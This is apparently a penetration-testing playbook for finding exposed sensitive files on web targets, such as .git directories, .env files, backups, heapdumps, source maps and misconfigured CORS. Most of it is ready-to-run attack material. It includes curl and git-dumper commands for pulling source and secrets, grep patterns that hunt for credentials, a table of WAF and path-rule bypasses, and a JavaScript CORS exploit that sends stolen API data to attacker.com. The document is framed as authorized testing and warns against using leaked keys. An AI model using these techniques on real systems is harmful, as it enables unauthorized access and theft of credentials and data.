# Information Disclosure / Sensitive Files

## Trigger

Load when you see:

- Version control paths returned 200: `/.git/HEAD`, `/.svn/entries`, `/.hg/`
- Backup files returned as non-HTML: `.rar`, `.zip`, `.tar.gz`, `.sql`, `.bak`
- Environment files: `/.env`, `/appsettings.json`, `/config.json`, `/settings.py`
- Debug endpoints: `/actuator/health`, `/phpinfo.php`, `/info.php`, `/server-status`
- API documentation: `/swagger-ui.html`, `/api-docs`, `/openapi.json`
- Source maps: `/static/js/main.*.js.map`
- Verbose error responses: stack traces, SQL errors, debug output
- HTML comments with endpoints, credentials, TODOs
- `CORS` misconfiguration reflecting arbitrary origins with credentials

## Attack Surface

- Exposed `.git` directory revealing full source code and commit history
- Backup files containing database dumps, configuration, credentials
- `.env` files with cloud service keys (AWS, Stripe, SendGrid, Twilio, JWT secret)
- Debug/probe endpoints leaking environment information
- Error pages exposing stack traces, file paths, DB queries, framework versions
- `robots.txt` and `sitemap.xml` revealing hidden admin/internal paths
- Client-side JS bundles containing API endpoints, API keys, or business logic
- Unsecured cloud storage buckets (S3, OSS, COS) with public listing

## Decision Tree

1. Check version control paths: `.git/HEAD`, `.svn/entries`, `.hg/store`, `.bzr/`
2. Check backup files: `wwwroot.zip`, `backup.sql`, `config.php.bak`, `.env.bak`
3. Check debug endpoints: `/actuator/health`, `/phpinfo.php`, `/server-status`
4. Check config files: `/.env`, `/config.json`, `/web.config`, `/WEB-INF/web.xml`
5. Check client-side code: JS files, source maps, HTML comments
6. Check error pages: trigger errors with `?id=1'`, `?file=`, `?id[]=1`
7. Check CORS misconfiguration: `curl -H "Origin: http://evil.com"` checking response headers

## Techniques

### Version Control Leak Detection

```bash
# Git
curl -s -o /dev/null -w "%{http_code} %{size_download}" http://target/.git/HEAD
# .git/HEAD content should be "ref: refs/heads/main"

# SVN (popular vector, 393 disclosed cases)
curl -s http://target/.svn/entries
curl -s http://target/.svn/wc.db

# Mercurial / Bazaar / CVS
curl -s http://target/.hg/store/00manifest.i
curl -s http://target/.bzr/branch/last-revision
```

### Git Repository Dump

```bash
# Automated git dump
git-dumper http://target/.git/ ./loot/
cd loot && git log --all

# Search all commits for secrets
git log -p --all -S "password"
git log -p --all -S "secret"
git log -p --all -S "api_key"
grep -rE "(password|secret|api.?key|token|jdbc:|mysql://|redis://)" .
```

### Git History Credential Leakage

```bash
# Secrets removed in later commits remain in git history
git log --all --oneline
git show <first_commit>  # First commit often contains the most secrets
git log -p --all -S "password"  # Search across ALL diffs
```

### Backup File Discovery

```bash
# Common backup name patterns
for ext in zip rar tar.gz sql bak old; do
  for name in www web site backup wwwroot data database db; do
    curl -s -o /dev/null -w "%{http_code} /$name.$ext\n" http://target/$name.$ext
  done
done

# Domain-based backup name
curl -s -o /dev/null -w "%{http_code}\n" "http://target/example.com.zip"

# Editor temp files
curl http://target/index.php~
curl http://target/.index.php.swp
```

### .env / Configuration Leak

```bash
curl http://target/.env
# Common contents:
# AWS_ACCESS_KEY_ID=AKIA...
# AWS_SECRET_ACCESS_KEY=...
# STRIPE_SECRET_KEY=sk_live_...
# SENDGRID_API_KEY=SG....
# TWILIO_AUTH_TOKEN=...
# JWT_SECRET=...
# DATABASE_URL=postgres://user:pass@host/db
```

### Heapdump Extraction

```bash
# Spring Boot actuator heapdump
curl http://target/actuator/heapdump -o heap.bin
strings heap.bin | grep -iE "(password|secret|jdbc|jwt|redis|aws)" | sort -u
```

### Directory Listing Enumeration

```bash
for tool in phpmyadmin adminer admin uploads backup logs installer; do
  curl -s -o /dev/null -w "%{http_code} %{size_download} /$tool/\n" http://target/$tool/
done
```

### Error Page Information Leak

```text
?id=1'              -> SQL error (DB type + full path disclosure)
?id[]=1             -> Type error (PHP/Java stack trace)
?file=              -> Empty value path leak
?debug=true         -> Debug mode toggle (if supported)
```

### Source Map Disclosure

```bash
# Source maps reveal original TypeScript/SCSS source
curl http://target/static/js/main.abcd1234.js.map -o main.js.map
# Extract API endpoints from source map
grep -oE '"/api/[^"]+' main.js.map | sort -u
```

### CORS Misconfiguration

```python
import requests

# Test for reflected Origin with credentials
targets = [
    "http://evil.com",
    "http://target.com.evil.com",
    "null",
    "http://eviltarget.com"
]

for origin in targets:
    r = requests.get("http://target/api/sensitive",
                     headers={"Origin": origin})
    acao = r.headers.get("Access-Control-Allow-Origin", "")
    acac = r.headers.get("Access-Control-Allow-Credentials", "")
    if origin in acao or acao == "*":
        print(f"[!] Reflected: {origin} -> ACAC: {acac}")
```

```javascript
// Exploit: steal data via CORS misconfig (host on attacker server)
fetch('http://target/api/sensitive', { credentials: 'include' })
  .then(r => r.json())
  .then(data => fetch('http://attacker.com/steal?d=' + btoa(JSON.stringify(data))));
```

### OSS / S3 Bucket Enumeration

```bash
# AWS S3
curl -s http://bucket.s3.amazonaws.com/?list-type=2
# Alibaba OSS
curl -s http://bucket.oss-cn-hangzhou.aliyuncs.com/?prefix=
# Tencent COS
curl -s http://bucket.cos.ap-guangzhou.myqcloud.com/?prefix=
```

### WAF Fingerprint via Response Headers

```bash
curl -sI http://target | grep -iE "server|x-powered-by|x-aspnet-version|x-dns-prefetch"
# Cloudflare: cf-ray, cf-cache-status
# Akamai: x-akamai-transformed
# AWS: x-amz-rid, x-amz-cf-id
```

### URL Scanning Automation

```bash
# dirsearch with sensitive file dictionary
dirsearch -u http://target/ -e php,jsp,asp,bak,zip,rar,sql -w sensitive-paths.txt
ffuf -u http://target/FUZZ -w sensitive-paths.txt -mc 200,301 -fc 404
nuclei -u http://target -t exposures/
```

## Bypass

| Block | Bypass |
|-------|--------|
| `.git` blocked by path rule | `.GIT/`, `.GiT/`, `%2egit/`, `/x/../.git/`, `//.git/` |
| `.env` blocked | `/static/../.env`, `/.env%20`, `/.env.bak` |
| Backup file extension blocked | `.bak.bak`, `.swp` instead of `.bak` |
| Cloudflare WAF | Find origin IP via history, certificate transparency, DNS |
| CDN cache masking | Versioned backup filenames: `backup_20240522.zip` |

## Verification

- `.git/HEAD` returning `ref: refs/heads/main` with 200 = full source leak (CVSS 7.5+)
- `.env` returning 200 + Content-Type text/plain with `=` = configuration leak (CVSS 9.8 if it contains cloud keys)
- Backup files with Content-Length > 1MB = full source/database leak
- Verbose SQL errors = SQL injection risk and path disclosure
- `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true` = exploitable CORS
- Heapdump accessible = critical memory disclosure (CVSS 9.8)

## Pitfalls

- Do NOT clone full source to public repositories. Save locally and delete after reporting.
- Do NOT use leaked AWS/Stripe credentials. Only prove connectivity (e.g., DNS resolution, banner).
- Do NOT include full credentials in reports. Redact to first 4 + last 4 characters + length.
- `.git/HEAD` alone does not confirm full clone access -- try `.git/config` and `.git/objects/`.
- Backup file sizes matter: < 1KB is likely not useful; > 100KB is likely a real backup.
- SVN 1.7+ stores metadata in `wc.db` (SQLite), not in individual files -- `sqlite3 wc.db .tables`.
- Wayback Machine can reveal historical endpoints, secrets, and pages that were removed.
